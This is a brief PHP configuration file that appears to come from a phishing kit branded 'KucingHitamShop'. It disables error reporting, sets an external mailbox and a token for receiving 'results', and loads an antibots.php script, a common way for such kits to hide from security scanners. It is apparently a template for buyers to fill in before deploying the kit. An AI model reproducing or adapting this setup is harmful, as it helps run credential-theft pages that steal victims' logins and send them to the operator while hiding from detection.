<?php

/*
+-=[K]ucing[H]itam[S]hop=-+
*/

error_reporting(0);

$to          = 'n.rezult@yandex.com';         // Edit Your Email
$token2      = '0oF0VOFHR4bRV3fcK62KU2THSYwSuY9a';             // Edit Your Token
$tembus_emel = 'no';                               // Tembus Email 
 

include(__DIR__).'/antibots.php';